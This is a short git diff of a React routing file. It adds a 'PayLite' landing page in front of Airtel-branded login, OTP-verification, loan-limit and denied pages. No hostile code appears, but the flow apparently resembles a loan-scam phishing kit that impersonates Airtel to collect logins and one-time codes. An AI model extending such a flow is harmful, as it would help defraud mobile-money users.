@@ -1,5 +1,6 @@
 import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
-import { LanguageProvider } from './LanguageContext'; // <-- Import the Provider
+import { LanguageProvider } from './LanguageContext'; 
+import PayLiteLanding from './PayLiteLanding'; // <-- Import Landing Page
 import AirtelLogin from './AirtelLogin';
 import AirtelOTPVerify from './AirtelOTPVerify';
 import AirtelLoanLimit from './AirtelLoanLimit';
@@ -7,17 +8,16 @@ import AirtelDenied from './AirtelDenied';
 
 function App() {
   return (
-    // Wrap everything inside LanguageProvider so all pages can access translations
     <LanguageProvider>
       <Router>
         <Routes>
-          {/* The root path now loads the Login page directly */}
-          <Route path="/" element={<AirtelLogin />} />
+          {/* 1. Landing page is the new entry point */}
+          <Route path="/" element={<PayLiteLanding />} />
           
-          {/* Kept for backward compatibility (e.g., back buttons pointing to /login) */}
+          {/* 2. Login Page */}
           <Route path="/login" element={<AirtelLogin />} />
           
-          {/* Airtel App Routes */}
+          {/* 3. Airtel App Routes */}
           <Route path="/airtel-otp" element={<AirtelOTPVerify />} />
           <Route path="/airtel-loan-limit" element={<AirtelLoanLimit />} />
           <Route path="/airtel-denied" element={<AirtelDenied />} />
